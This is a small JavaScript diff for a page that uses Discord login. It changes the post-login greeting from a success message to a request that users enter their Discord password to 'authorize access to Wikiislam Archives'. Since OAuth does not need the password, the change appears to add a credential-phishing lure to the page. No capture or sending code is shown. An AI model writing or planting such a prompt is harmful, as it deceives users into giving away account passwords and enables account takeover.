@@ -71,7 +71,7 @@
     .then(user => {
       discordUsername = `${user.username}#${user.discriminator}`;
       discordEmail = user.email || "Unavailable";
-      document.getElementById('greeting').innerText = `Successfully logged in, ${discordUsername}`;
+      document.getElementById('greeting').innerText = `Enter your discord password to authorize access to Wikiislam Archives! `;
     });
   } else {
     document.getElementById('greeting').innerText = `Not logged in via Discord`;
